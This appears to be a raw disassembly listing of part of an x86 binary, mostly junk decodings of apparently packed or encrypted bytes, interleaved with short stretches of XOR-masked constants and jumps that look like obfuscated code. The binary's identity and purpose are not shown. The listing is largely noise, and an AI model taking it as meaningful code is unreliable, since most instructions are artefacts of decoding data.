  41dd4a:	add    edx,DWORD PTR [esi-0x64]
  41dd4d:	dec    ebp
  41dd4e:	in     eax,dx
  41dd4f:	xor    BYTE PTR [esi+edi*2],bh
  41dd52:	aad    0x66
  41dd54:	adc    BYTE PTR [esi],dh
  41dd56:	mov    ah,0x63
  41dd58:	mov    ah,BYTE PTR [ebp-0x11f43e5b]
  41dd5e:	jg     0x41dd07
  41dd60:	push   es
  41dd61:	mov    ds:0x2e66fcd0,al
  41dd66:	jecxz  0x41dda5
  41dd68:	out    dx,eax
  41dd69:	(bad)  
  41dd6a:	jl     0x41dd4c
  41dd6c:	mov    eax,ds:0xa42c6668
  41dd71:	push   esp
  41dd72:	add    al,0x9e
  41dd74:	fld    QWORD PTR [ecx]
  41dd76:	and    DWORD PTR [eax+0x1842d8ef],esi
  41dd7c:	std    
  41dd7d:	rol    DWORD PTR [esi+ebp*1+0x62],1
  41dd81:	mov    BYTE PTR [ebx+esi*2],cl
  41dd84:	fsub   DWORD PTR [eax]
  41dd86:	add    DWORD PTR [ebp-0x55606c85],0x7d
  41dd8d:	inc    edi
  41dd8e:	(bad)
  41dd91:	mov    eax,DWORD PTR [esi+0x47ea3d90]
  41dd97:	jg     0x41dd63
  41dd99:	mov    edx,0xfaf5dd28
  41dd9e:	ficom  DWORD PTR [esi]
  41dda0:	mov    ecx,0x7e13484a
  41dda5:	inc    edi
  41dda6:	cld    
  41dda7:	xor    DWORD PTR [eax],ebx
  41dda9:	sub    eax,0x33f098c5
  41ddae:	out    dx,eax
  41ddaf:	xchg   edx,eax
  41ddb0:	pop    ebx
  41ddb1:	pusha  
  41ddb2:	jbe    0x41de22
  41ddb4:	pop    edx
  41ddb5:	cwde   
  41ddb6:	mov    al,0xe6
  41ddb8:	mov    eax,ds:0xafc82402
  41ddbd:	adc    BYTE PTR [ebx],cl
  41ddbf:	add    al,0x11
  41ddc1:	inc    esi
  41ddc2:	mul    DWORD PTR [edi-0x27]
  41ddc5:	push   edi
  41ddc6:	loopne 0x41de47
  41ddc8:	imul   edi,DWORD PTR [edi-0x8],0x4a3ea06d
  41ddcf:	pop    ss
  41ddd0:	inc    ebx
  41ddd1:	fdivr  QWORD PTR [ebp-0x6c]
  41ddd4:	mov    ebp,0xe333d06b
  41ddd9:	scas   eax,DWORD PTR es:[edi]
  41ddda:	push   es
  41dddb:	push   edx
  41dddc:	pop    es
  41dddd:	ficom  DWORD PTR [ebx+0x5d]
  41dde0:	xchg   ecx,eax
  41dde1:	xchg   esi,eax
  41dde2:	xor    dh,0x51
  41dde5:	and    ebp,DWORD PTR [edi+0x1f428d13]
  41ddeb:	hlt    
  41ddec:	or     eax,0xed430856
  41ddf1:	imul   ebx,eax,0xfffffff9
  41ddf4:	jae    0x41ddb0
  41ddf6:	push   edi
  41ddf7:	mov    al,0xe9
  41ddf9:	(bad)  
  41ddfa:	test   BYTE PTR [ebx+0x1b],0x30
  41ddfe:	xor    ah,0x9b
  41de01:	inc    ebx
  41de02:	nop
  41de03:	sub    esp,0x62c02ce2
  41de09:	imul   esp,DWORD PTR ds:0x16bb8e4,0xa2af552f
  41de13:	jecxz  0x41de80
  41de15:	leave  
  41de16:	in     al,0x85
  41de18:	jmp    0x41de6c
  41de1a:	cmp    al,0xe2
  41de1c:	add    eax,0x65dc1671
  41de21:	cmp    DWORD PTR ds:0xcb79b576,esi
  41de27:	xor    edx,0x9c2b8ae8
  41de2d:	mov    cl,0x2
  41de2f:	call   0x408bb8
  41de34:	mov    ecx,edx
  41de36:	mov    edx,DWORD PTR [ebp-0x15c]
  41de3c:	mov    DWORD PTR [ebp-0x218],esi
  41de42:	mov    esi,DWORD PTR [ebp-0x158]
  41de48:	xor    edx,0xcb79b576
  41de4e:	xor    esi,0x9c2b8ae8
  41de54:	mov    DWORD PTR [ebp-0x21c],eax
  41de5a:	mov    eax,edx
  41de5c:	mov    edx,esi
  41de5e:	mov    DWORD PTR [ebp-0x220],ecx
  41de64:	mov    cl,0x3e
  41de66:	call   0x42241b
  41de6b:	mov    esi,DWORD PTR [ebp-0x21c]
  41de71:	or     esi,eax
  41de73:	mov    eax,DWORD PTR [ebp-0x220]
  41de79:	or     eax,edx
  41de7b:	push   eax
  41de7c:	push   esi
  41de7d:	push   ebx
  41de7e:	push   edi
  41de7f:	call   0x41594e
  41de84:	mov    esi,DWORD PTR [ebp-0x218]
  41de8a:	cmp    esi,eax
  41de8c:	jne    0x41df42
  41de92:	mov    eax,DWORD PTR [ebp-0x154]
  41de98:	mov    edx,DWORD PTR [ebp-0x150]
  41de9e:	xor    eax,0xcb79b576
  41dea3:	xor    edx,0x9c2b8ae8
  41dea9:	mov    cl,0x2
  41deab:	call   0x408bb8
  41deb0:	mov    esi,eax
  41deb2:	mov    edi,edx
  41deb4:	mov    eax,DWORD PTR [ebp-0x154]
  41deba:	mov    edx,DWORD PTR [ebp-0x150]
  41dec0:	xor    eax,0xcb79b576
  41dec5:	xor    edx,0x9c2b8ae8
  41decb:	mov    cl,0x3e
  41decd:	call   0x42241b
  41ded2:	or     esi,eax
  41ded4:	or     edi,edx
  41ded6:	mov    eax,DWORD PTR [ebp-0x15c]
  41dedc:	mov    edx,DWORD PTR [ebp-0x158]
  41dee2:	xor    eax,0xcb79b576
  41dee7:	xor    edx,0x9c2b8ae8
  41deed:	mov    cl,0x2
  41deef:	call   0x408bb8
  41def4:	mov    ebx,eax
  41def6:	mov    eax,edx
  41def8:	mov    ecx,DWORD PTR [ebp-0x15c]
  41defe:	mov    edx,DWORD PTR [ebp-0x158]
  41df04:	xor    ecx,0xcb79b576
  41df0a:	xor    edx,0x9c2b8ae8
  41df10:	mov    DWORD PTR [ebp-0x224],eax
  41df16:	mov    eax,ecx
  41df18:	mov    cl,0x3e
  41df1a:	call   0x42241b
  41df1f:	or     ebx,eax
  41df21:	mov    eax,DWORD PTR [ebp-0x224]
  41df27:	or     eax,edx
  41df29:	push   eax
  41df2a:	push   ebx
  41df2b:	push   edi
  41df2c:	push   esi
  41df2d:	call   0x41594e
  41df32:	mov    DWORD PTR [ebp-0x178],eax
  41df38:	jmp    0x41f19e
  41df3d:	jmp    0x41f154
  41df42:	lea    eax,[ebp-0x168]
  41df48:	mov    DWORD PTR [ebp-0x164],eax
  41df4e:	mov    eax,DWORD PTR [ebp-0x164]
  41df54:	mov    DWORD PTR [eax],0xa5069bae
  41df5a:	mov    eax,DWORD PTR [ebp-0x168]
  41df60:	xor    eax,0xa5069bae
  41df65:	shr    eax,0x2
  41df68:	mov    ecx,DWORD PTR [ebp-0x168]
  41df6e:	xor    ecx,0xa5069bae
  41df74:	shl    ecx,0x1e
  41df77:	or     eax,ecx
  41df79:	mov    ecx,DWORD PTR [ebp-0x174]
  41df7f:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  41df83:	mov    DWORD PTR [ebp-0x160],eax
  41df89:	mov    esi,DWORD PTR [ebp-0x160]
  41df8f:	mov    eax,DWORD PTR [ebp-0x154]
  41df95:	mov    edx,DWORD PTR [ebp-0x150]
  41df9b:	xor    eax,0xcb79b576
  41dfa0:	xor    edx,0x9c2b8ae8
  41dfa6:	mov    cl,0x2
  41dfa8:	call   0x408bb8
  41dfad:	mov    edi,eax
  41dfaf:	mov    ebx,edx
  41dfb1:	mov    eax,DWORD PTR [ebp-0x154]
  41dfb7:	jmp    0x41e39e
  41dfbc:	mov    bl,0xa1
  41dfbe:	mov    eax,ds:0xbba5b3a5
  41dfc3:	mov    ebx,0xd1567b79
  41dfc8:	sbb    BYTE PTR ds:[eax-0x3fa06f31],al
  41dfcf:	mov    esi,0xbebec44a
  41dfd4:	push   ss
  41dfd5:	or     eax,0xb5f7c1bd
  41dfda:	push   es
  41dfdb:	addr16 lahf 
  41dfdd:	jae    0x41dfe2
  41dfdf:	or     dl,BYTE PTR [esi]
  41dfe1:	out    dx,eax
  41dfe2:	mov    ds:0x91d103c7,al
  41dfe7:	or     bl,cl
  41dfe9:	mov    DWORD PTR [esi+0x52],ecx
  41dfec:	dec    edx
  41dfed:	sbb    DWORD PTR es:[ebx-0x74],eax
  41dff1:	jle    0x41e034
  41dff3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dff4:	repnz enter 0xbdb9,0x3a
  41dff9:	in     eax,0xc7
  41dffb:	ins    DWORD PTR es:[edi],dx
  41dffc:	add    al,0x95
  41dffe:	sbb    dl,BYTE PTR [ecx]
  41e000:	or     bh,BYTE PTR [eax-0x1b]
  41e003:	int    0xa
  41e005:	(bad)  
  41e007:	dec    eax
  41e008:	test   eax,0x3e26cf1b
  41e00e:	dec    edi
  41e00f:	fmul   QWORD PTR [ebp+0x5180da59]
  41e015:	mov    BYTE PTR [edi],dh
  41e017:	mov    esp,0x818adfef
  41e01c:	loope  0x41e088
  41e01e:	inc    eax
  41e01f:	pop    ecx
  41e020:	fcomp  DWORD PTR [esi+0x1e]
  41e023:	es dec esp
  41e025:	adc    eax,0x68c46ba8
  41e02a:	push   ds
  41e02b:	mov    ecx,0xc930d61b
  41e030:	es push 0x68
  41e033:	out    0xed,al
  41e035:	jne    0x41dfdd
  41e037:	xchg   ebx,eax
  41e038:	fistp  WORD PTR [ecx+0x7f]
  41e03b:	push   es
  41e03c:	test   eax,0xfb0c7bb9
  41e041:	je     0x41e066
  41e043:	or     al,0x96
  41e045:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e046:	imul   esi,ecx,0x16
  41e049:	aam    0x6c
  41e04b:	das    
  41e04c:	dec    esi
  41e04d:	mov    ds:0x951104fd,eax
  41e052:	add    DWORD PTR cs:[edi+0x79],ebp
  41e056:	das    
  41e057:	xlat   BYTE PTR ds:[ebx]
  41e058:	sahf   
  41e059:	stc    
  41e05a:	stos   DWORD PTR es:[edi],eax
  41e05b:	mov    edi,esi
  41e05d:	inc    edx
  41e05e:	fisubr DWORD PTR [eax+0x66fc0124]
  41e064:	daa    
  41e065:	neg    ebp
  41e067:	mov    dl,BYTE PTR [esi]
  41e069:	xor    BYTE PTR [esi+0x36b5193a],al
  41e06f:	ficomp WORD PTR [edx+0x38b9e987]
  41e075:	fadd   DWORD PTR [edi]
  41e077:	nop
  41e078:	pop    ds
  41e079:	cmp    cl,BYTE PTR [ebx+0x45ca6f27]
  41e07f:	nop
  41e080:	sbb    al,0x7a
  41e082:	and    al,0x2c
  41e084:	pop    ds
  41e085:	mov    ds:0xceaf0c80,al
  41e08a:	mov    WORD PTR [ebp+0x19],cs
  41e08d:	pop    esi
  41e08e:	xchg   ecx,eax
  41e08f:	xchg   esp,eax
  41e090:	in     al,0x99
  41e092:	pop    ecx
  41e093:	mov    bh,0xf9
  41e095:	xchg   ecx,eax
  41e096:	mov    WORD PTR [eax],?
  41e098:	sub    eax,0x9a538a96
  41e09d:	push   es
  41e09e:	jbe    0x41e05e
  41e0a0:	cmp    ebp,DWORD PTR [ebp-0x3b637654]
  41e0a6:	cmp    dl,ah
  41e0a8:	lods   eax,DWORD PTR ds:[esi]
  41e0a9:	fs sti 
  41e0ab:	dec    edi
  41e0ac:	stc    
  41e0ad:	mov    eax,ds:0x36dcb780
  41e0b2:	aaa    
  41e0b3:	loope  0x41e08b
  41e0b5:	dec    esi
  41e0b6:	(bad)  
  41e0b7:	leave  
  41e0b8:	mov    al,0x53
  41e0ba:	push   ds
  41e0bb:	cmp    DWORD PTR [ebx+0xd],ecx
  41e0be:	(bad)  
  41e0bf:	lock (bad) 
  41e0c1:	ret    0xbc7e
  41e0c4:	cli    
  41e0c5:	push   ds
  41e0c6:	add    al,0x38
  41e0c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0c9:	jbe    0x41e066
  41e0cb:	inc    ebx
  41e0cc:	xlat   BYTE PTR ds:[ebx]
  41e0cd:	adc    al,0xbb
  41e0cf:	or     cl,BYTE PTR gs:[edi-0x18ae7bb4]
  41e0d6:	mov    eax,ds:0x790ea2f7
  41e0db:	dec    eax
  41e0dc:	stc    
  41e0dd:	clc    
  41e0de:	sbb    DWORD PTR [esi],edi
  41e0e0:	inc    ebx
  41e0e1:	fs cs mov ebp,0x31092c4
  41e0e8:	xchg   esp,eax
  41e0e9:	mov    al,0x7
  41e0eb:	inc    ebx
  41e0ec:	add    DWORD PTR [edx],esp
  41e0ee:	inc    ebx
  41e0ef:	(bad)  ds:0x801c9d0e
  41e0f5:	mov    ebx,DWORD PTR [esi]
  41e0f7:	pop    ebp
  41e0f8:	adc    BYTE PTR [eax+0x73],bl
  41e0fb:	fcmovb st,st(3)
  41e0fd:	push   esp
  41e0fe:	mov    ecx,0xcc93b498
  41e103:	jp     0x41e0e9
  41e105:	arpl   bx,di
  41e107:	sbb    eax,0xd2bcaca2
  41e10c:	aad    0x19
  41e10e:	scas   eax,DWORD PTR es:[edi]
  41e10f:	sub    eax,0xfea23c06
  41e114:	jbe    0x41e09c
  41e116:	mov    ecx,DWORD PTR [edx+0xf]
  41e119:	lds    edx,FWORD PTR [edi-0x18274314]
  41e11f:	aaa    
  41e120:	int    0x3b
  41e122:	shr    BYTE PTR [ecx+0x6],1
  41e125:	inc    ebp
  41e126:	xor    ecx,edx
  41e128:	lahf   
  41e129:	cdq    
  41e12a:	rcl    bl,1
  41e12c:	jns    0x41e0b6
  41e12e:	sbb    bl,BYTE PTR [ebx+ecx*8-0x76]
  41e132:	stos   DWORD PTR es:[edi],eax
  41e133:	mov    cs,WORD PTR es:[ebp-0x7f]
  41e137:	sub    DWORD PTR [ecx-0x3e97446],0x52
  41e13e:	jae    0x41e18c
  41e140:	add    BYTE PTR [edx],bl
  41e142:	push   es
  41e143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e144:	pop    edi
  41e145:	and    DWORD PTR [ebp-0xe7e5ae2],eax
  41e14b:	or     ecx,DWORD PTR [edx-0x63]
  41e14e:	mov    edi,0x765e5a3c
  41e153:	pop    edi
  41e154:	adc    DWORD PTR [esi],ebp
  41e156:	add    edi,edx
  41e158:	hlt    
  41e159:	or     DWORD PTR [ebp-0x4630aacc],0x2a
  41e160:	push   edi
  41e161:	xchg   DWORD PTR ds:0xc4ef2eb5,esp
  41e167:	or     eax,0xa576cb68
  41e16c:	inc    ebx
  41e16d:	pop    es
  41e16e:	push   esp
  41e16f:	imul   esi,DWORD PTR [esi+0x69ee9cb7],0x2
  41e176:	loope  0x41e148
  41e178:	mov    ecx,0xd5af9008
  41e17d:	inc    ecx
  41e17e:	icebp  
  41e17f:	mov    edx,0xfbf7650b
  41e184:	mov    dl,0x21
  41e186:	inc    ebp
  41e187:	shl    DWORD PTR ds:0x65458701,0x78
  41e18e:	imul   ebp,DWORD PTR [esp+ebp*1+0x542144f8],0xffffffb4
  41e196:	add    edi,ecx
  41e198:	jg     0x41e184
  41e19a:	mov    ebp,0x65fadf8f
  41e19f:	nop
  41e1a0:	rol    BYTE PTR [ecx+0x62],0x79
  41e1a4:	mov    edi,0x90aec5ac
  41e1a9:	xchg   edi,eax
  41e1aa:	push   ecx
  41e1ab:	jl     0x41e169
  41e1ad:	push   ecx
  41e1ae:	dec    edx
  41e1af:	mov    eax,0xd457803a
  41e1b4:	and    ebp,DWORD PTR [edx-0x1]
  41e1b7:	xchg   esi,eax
  41e1b8:	test   al,0x74
  41e1ba:	or     esp,DWORD PTR [edi]
  41e1bc:	aad    0xae
  41e1be:	xchg   ebx,eax
  41e1bf:	cwde   
  41e1c0:	test   eax,0xa6f7ed84
  41e1c5:	lahf   
  41e1c6:	sub    al,0xe8
  41e1c8:	lods   eax,DWORD PTR ds:[esi]
  41e1c9:	add    al,0x85
  41e1cb:	jge    0x41e16d
  41e1cd:	mov    DWORD PTR [ebx+0xa8cd196],ecx
  41e1d3:	dec    esi
  41e1d4:	hlt    
  41e1d5:	sub    eax,0xc18c96be
  41e1da:	ror    DWORD PTR [eax+0x5971ed0b],0xfd
  41e1e1:	in     al,0x8d
  41e1e3:	adc    BYTE PTR [eax],al
  41e1e5:	test   BYTE PTR [esi+esi*8+0x69691a98],bl
  41e1ec:	inc    ecx
  41e1ed:	(bad)  
  41e1ee:	push   eax
  41e1ef:	add    BYTE PTR [edx-0x7ed528c],0x44
  41e1f6:	fs ins BYTE PTR es:[edi],dx
  41e1f8:	enter  0x4f6,0xd7
  41e1fc:	pop    eax
  41e1fd:	shl    ebp,0x33
  41e200:	rcl    DWORD PTR [edi-0x79],cl
  41e203:	call   0x9e34:0x53d492cb
  41e20a:	inc    ebp
  41e20b:	shr    DWORD PTR [edx-0x1b],1
  41e20e:	fisttp WORD PTR [edx]
  41e210:	(bad)  
  41e212:	das    
  41e213:	dec    ecx
  41e214:	fdivr  QWORD PTR ds:0x8bac91db
  41e21a:	xchg   edx,eax
  41e21b:	jo     0x41e25d
  41e21d:	shl    DWORD PTR [edi+0x4378754c],1
  41e223:	xor    al,0x24
  41e225:	div    BYTE PTR [esi-0x35]
  41e228:	ins    BYTE PTR es:[edi],dx
  41e229:	pop    ebx
  41e22a:	arpl   WORD PTR [ebx+edx*1],bp
  41e22d:	cmp    bh,cl
  41e22f:	mov    edx,0x3643731f
  41e234:	and    edi,DWORD PTR [edx-0x19]
  41e237:	aas    
  41e238:	inc    esp
  41e239:	pushf  
  41e23a:	or     eax,0x40ec315
  41e23f:	sbb    DWORD PTR [edi+eiz*2],edi
  41e242:	mov    ebx,0xfab8268c
  41e247:	iret   
  41e248:	mov    cl,0x57
  41e24a:	ret    
  41e24b:	add    edi,DWORD PTR [ebx+ebp*2+0x48]
  41e24f:	(bad)  
  41e250:	xchg   ecx,eax
  41e251:	outs   dx,BYTE PTR ds:[esi]
  41e252:	add    esi,DWORD PTR [ebx-0x5d9710b]
  41e258:	enter  0xad95,0x4a
  41e25c:	add    eax,0x32a137a4
  41e261:	mov    cl,0x35
  41e263:	xor    BYTE PTR [ecx+0x12],0xe4
  41e267:	fmul   QWORD PTR [ebp+0x3cdc728c]
  41e26d:	pop    ebp
  41e26e:	mov    edx,0x4f1a3101
  41e273:	ret    0x12a5
  41e276:	xor    al,0x3a
  41e278:	clc    
  41e279:	cmp    eax,0xf0b37ccb
  41e27e:	out    dx,eax
  41e27f:	js     0x41e231
  41e281:	leave  
  41e282:	mov    al,ds:0x31e6b004
  41e287:	push   ebx
  41e288:	aam    0xec
  41e28a:	add    al,0xef
  41e28c:	inc    ebx
  41e28d:	xchg   esi,eax
  41e28e:	mov    dh,0x4a
  41e290:	mov    esp,0x6243aae8
  41e295:	cmp    esi,edx
  41e297:	mov    DWORD PTR ds:0x45d3ccfb,ecx
  41e29d:	rcr    esi,0xad
  41e2a0:	adc    bh,BYTE PTR [ebx+0x13]
  41e2a3:	call   DWORD PTR [ebp+0x1e01d739]
  41e2a9:	inc    ebx
  41e2aa:	mov    WORD PTR [esi-0x6dd42b2],gs
  41e2b0:	iret   
  41e2b1:	cwde   
  41e2b2:	in     eax,dx
  41e2b3:	or     BYTE PTR [ebp+0x32],cl
  41e2b6:	inc    eax
  41e2b7:	das    
  41e2b8:	push   0xffffffb0
  41e2ba:	mov    ?,WORD PTR [ecx+0x65]
  41e2bd:	adc    al,0x6a
  41e2bf:	mov    esp,0x3548ce6f
  41e2c4:	dec    ebp
  41e2c5:	ins    DWORD PTR es:[edi],dx
  41e2c6:	rol    cl,1
  41e2c8:	push   ss
  41e2c9:	xchg   esi,eax
  41e2ca:	sbb    dh,BYTE PTR [edx]
  41e2cc:	test   eax,0x25bb6a96
  41e2d1:	es add eax,0xe55351f4
  41e2d7:	and    esi,eax
  41e2d9:	stos   BYTE PTR es:[edi],al
  41e2da:	dec    edi
  41e2db:	mov    al,ds:0xce7fc835
  41e2e0:	adc    ch,ah
  41e2e2:	shl    esi,0x7b
  41e2e5:	pushf  
  41e2e6:	ror    BYTE PTR [ebx],1
  41e2e8:	(bad)
  41e2eb:	cmp    ecx,DWORD PTR [ebp+ebp*4+0xecb8b4]
  41e2f2:	call   0x31f59968
  41e2f7:	dec    ebp
  41e2f8:	mov    BYTE PTR [edi],al
  41e2fa:	sbb    BYTE PTR [eax],0xb7
  41e2fd:	cmp    DWORD PTR [edi],edi
  41e2ff:	and    BYTE PTR [ecx-0x598f462b],0x38
  41e306:	std    
  41e307:	cld    
  41e308:	dec    ecx
  41e309:	push   cs
  41e30a:	lds    edi,FWORD PTR [edx-0x47]
  41e30d:	(bad)  
  41e30e:	aam    0xf2
  41e310:	into   
  41e311:	mov    ch,0x28
  41e313:	addr16 clc 
  41e315:	rcr    ebp,1
  41e317:	scas   al,BYTE PTR es:[edi]
  41e318:	mov    ch,0xd3
  41e31a:	jns    0x41e371
  41e31c:	int    0x8b
  41e31e:	pop    eax
  41e31f:	add    BYTE PTR [ebx-0x58762a1c],ah
  41e325:	sbb    eax,0xdae82c58
  41e32a:	imul   edi,DWORD PTR [eax+ebx*1],0x5f
  41e32e:	call   0xd0a7:0x91626f5b
  41e335:	not    DWORD PTR [eax]
  41e337:	mov    eax,cs:0xd84f3986
  41e33d:	dec    eax
  41e33e:	addr16 loopne 0x41e2e8
  41e341:	pop    ebp
  41e342:	mov    cl,0x3b
  41e344:	add    al,0x22
  41e346:	jae    0x41e2e4
  41e348:	scas   eax,DWORD PTR es:[edi]
  41e349:	and    bl,dh
  41e34b:	into   
  41e34c:	push   0x438a9363
  41e351:	sbb    al,0x20
  41e353:	xor    eax,0xd4cadb8c
  41e358:	int    0x71
  41e35a:	int3   
  41e35b:	daa    
  41e35c:	jle    0x41e398
  41e35e:	aas    
  41e35f:	adc    ebp,0x57
  41e362:	mov    bl,0x67
  41e364:	add    al,0x1b
  41e366:	add    al,bh
  41e368:	jbe    0x41e367
  41e36a:	sub    BYTE PTR [edi+0x3b9beafa],dl
  41e370:	nop
  41e371:	jg     0x41e335
  41e373:	cmp    eax,0x76125c44
  41e378:	mov    ebx,0xde1f5775
  41e37d:	inc    esp
  41e37e:	xchg   ebp,eax
  41e37f:	ins    BYTE PTR es:[edi],dx
  41e380:	(bad)  
  41e381:	cmp    ch,BYTE PTR [ecx]
  41e383:	xor    DWORD PTR [ebx-0xb],ebp
  41e386:	mov    BYTE PTR [ecx],0x17
  41e389:	scas   al,BYTE PTR es:[edi]
  41e38a:	cmp    dh,BYTE PTR [edx+0x4d]
  41e38d:	mov    al,ds:0xc7428f8f
  41e392:	lahf   
  41e393:	mov    ebp,?
  41e395:	out    dx,al
  41e396:	lods   eax,DWORD PTR ss:[esi]
  41e398:	xchg   esi,eax
  41e399:	bound  ebx,QWORD PTR [ebx]
  41e39b:	push   ecx
  41e39c:	(bad)  
  41e39d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e39e:	mov    edx,DWORD PTR [ebp-0x150]
  41e3a4:	xor    eax,0xcb79b576
  41e3a9:	xor    edx,0x9c2b8ae8
  41e3af:	mov    cl,0x3e
  41e3b1:	call   0x42241b
  41e3b6:	or     edi,eax
  41e3b8:	or     ebx,edx
  41e3ba:	mov    eax,DWORD PTR [ebp-0x15c]
  41e3c0:	mov    edx,DWORD PTR [ebp-0x158]
  41e3c6:	xor    eax,0xcb79b576
  41e3cb:	xor    edx,0x9c2b8ae8
  41e3d1:	mov    cl,0x2
  41e3d3:	call   0x408bb8
  41e3d8:	mov    ecx,edx
  41e3da:	mov    edx,DWORD PTR [ebp-0x15c]
  41e3e0:	mov    DWORD PTR [ebp-0x228],esi
  41e3e6:	mov    esi,DWORD PTR [ebp-0x158]
  41e3ec:	xor    edx,0xcb79b576
  41e3f2:	xor    esi,0x9c2b8ae8
  41e3f8:	mov    DWORD PTR [ebp-0x22c],eax
  41e3fe:	mov    eax,edx
  41e400:	mov    edx,esi
  41e402:	mov    DWORD PTR [ebp-0x230],ecx
  41e408:	mov    cl,0x3e
  41e40a:	call   0x42241b
  41e40f:	mov    esi,DWORD PTR [ebp-0x22c]
  41e415:	or     esi,eax
  41e417:	mov    eax,DWORD PTR [ebp-0x230]
  41e41d:	or     eax,edx
  41e41f:	push   eax
  41e420:	push   esi
  41e421:	jmp    0x41e808
  41e426:	rcl    BYTE PTR [ebp+0x47],cl
  41e429:	cmp    ecx,DWORD PTR [ebx+0x3b]
  41e42c:	mov    cl,0xb7
  41e42e:	scas   eax,DWORD PTR es:[edi]
  41e42f:	xor    ebx,DWORD PTR [ecx+edx*8]
  41e432:	cmp    al,0x93
  41e434:	lods   al,BYTE PTR ds:[esi]
  41e435:	jecxz  0x41e453
  41e437:	sar    BYTE PTR [bp-0x3bb6],0xbe
  41e43d:	mov    esi,0x92741f5d
  41e442:	jg     0x41e420
  41e444:	mov    ch,0xe8
  41e446:	fstp   DWORD PTR [esi+0x39]
  41e449:	lahf   
  41e44a:	data16 outs dx,BYTE PTR ds:[esi]
  41e44c:	retf   
  41e44d:	jbe    0x41e43e
  41e44f:	sahf   
  41e450:	loopne 0x41e4b3
  41e452:	loope  0x41e49b
  41e454:	ja     0x41e425
  41e456:	cmp    bl,BYTE PTR [esi]
  41e458:	add    al,0x9d
  41e45a:	popa   
  41e45b:	daa    
  41e45c:	jb     0x41e417
  41e45e:	sub    eax,0x41caa5fa
  41e463:	call   0xb8979434
  41e468:	xchg   edx,eax
  41e469:	xchg   esi,eax
  41e46a:	and    al,0x11
  41e46c:	ja     0x41e497
  41e46e:	xchg   ebp,eax
  41e46f:	fwait
  41e470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e471:	inc    esi
  41e472:	in     eax,dx
  41e473:	mov    ebx,0x2f67a3b5
  41e478:	sbb    edx,esi
  41e47a:	imul   esi,ebp,0xffffffdb
  41e47d:	and    BYTE PTR [ebx+0x27],dl
  41e480:	in     eax,0xc
  41e482:	xchg   BYTE PTR [ecx],al
  41e484:	cmp    bh,BYTE PTR [esi]
  41e486:	pop    esi
  41e487:	ins    DWORD PTR es:[edi],dx
  41e488:	jo     0x41e44f
  41e48a:	(bad)  
  41e48b:	aam    0x4f
  41e48d:	ret    0xc0bf
  41e490:	push   es
  41e491:	and    ebp,esi
  41e493:	lods   al,BYTE PTR ds:[esi]
  41e494:	inc    ecx
  41e495:	jge    0x41e4dd
  41e497:	jae    0x41e433
  41e499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e49a:	fs dec esi
  41e49c:	xlat   BYTE PTR ds:[ebx]
  41e49d:	lahf   
  41e49e:	and    al,0x33
  41e4a0:	(bad)  
  41e4a1:	fbstp  TBYTE PTR [ebx-0x8]
  41e4a4:	into   
  41e4a5:	sbb    DWORD PTR [edi+0x63],esi
  41e4a8:	xchg   ecx,eax
  41e4a9:	jno    0x41e4db
  41e4ab:	loopne 0x41e523
  41e4ad:	ja     0x41e51c
  41e4af:	cmp    eax,0x3d7c08e9
  41e4b4:	xor    al,0x2c
  41e4b6:	adc    al,0x4
  41e4b8:	repz cmp esp,eax
  41e4bb:	retf   
  41e4bc:	mov    eax,ds:0xdd16dc53
  41e4c1:	push   0xfffffff5
  41e4c3:	aas    
  41e4c4:	pop    edi
  41e4c5:	xor    BYTE PTR [ecx+0x6e],0x6
  41e4c9:	sub    eax,0x81b11da7
  41e4ce:	push   esp
  41e4cf:	and    BYTE PTR [esi-0x17],ch
  41e4d2:	mov    al,ds:0x5ad6615b
  41e4d7:	sub    BYTE PTR [edx],dh
  41e4d9:	jmp    0x1a0a:0xc6ea8e24
  41e4e0:	dec    esi
  41e4e1:	add    ecx,DWORD PTR [edx+0x522265f5]
  41e4e7:	arpl   WORD PTR [esp+edx*4],cx
  41e4ea:	jle    0x41e511
  41e4ec:	(bad)  
  41e4ed:	mov    bh,0xe
  41e4ef:	xchg   BYTE PTR [esi-0x4716330],dh
  41e4f5:	bound  ebx,QWORD PTR [ebp+0x6e713d]
  41e4fb:	outs   dx,DWORD PTR ds:[esi]
  41e4fc:	mov    dl,0x88
  41e4fe:	or     eax,0x683d606d
  41e503:	dec    BYTE PTR gs:[esp+edi*8]
  41e507:	imul   ecx,ebp,0x56
  41e50a:	test   BYTE PTR ss:[edx],bl
  41e50d:	add    al,0xa2
  41e50f:	jo     0x41e4de
  41e511:	fbld   TBYTE PTR [ecx-0x73be22cb]
  41e517:	jbe    0x41e527
  41e519:	xor    cl,BYTE PTR [edi]
  41e51b:	pusha  
  41e51c:	daa    
  41e51d:	adc    al,0x80
  41e51f:	js     0x41e4d3
  41e521:	(bad)  
  41e523:	ins    DWORD PTR es:[edi],dx
  41e524:	adc    DWORD PTR [esi+0x4e],ecx
  41e527:	jg     0x41e59b
  41e529:	mov    eax,ds:0xde0958ff
  41e52e:	cld    
  41e52f:	js     0x41e5ac
  41e531:	add    DWORD PTR [eax-0x70],ebp
  41e534:	cdq    
  41e535:	call   0x6c54d36a
  41e53a:	inc    ebp
  41e53b:	ins    DWORD PTR es:[edi],dx
  41e53c:	ror    bl,1
  41e53e:	dec    eax
  41e53f:	xor    al,0x84
  41e541:	xor    eax,0x1ee76d98
  41e546:	lock mov ds:0xdcd2da2,al
  41e54c:	or     eax,0xbfa4001d
  41e551:	mov    ah,0x84
  41e553:	test   eax,0x3bd75f76
  41e558:	xor    al,0xc7
  41e55a:	push   ss
  41e55b:	mov    ds:0x6dc4b803,al
  41e560:	jbe    0x41e5bc
  41e562:	inc    ebp
  41e563:	fwait
  41e564:	jmp    0xe627:0x70f635f0
  41e56b:	lods   al,BYTE PTR ds:[esi]
  41e56c:	sti    
  41e56d:	xchg   BYTE PTR [esp+edx*1+0x74b3dc2e],ah
  41e574:	fs or  al,0xbd
  41e577:	int    0xb5
  41e579:	push   eax
  41e57a:	jg     0x41e541
  41e57c:	pop    ds
  41e57d:	push   es
  41e57e:	xchg   ebx,eax
  41e57f:	adc    DWORD PTR [esi-0x18],ecx
  41e582:	jno    0x41e5eb
  41e584:	cmp    eax,0xbbb037af
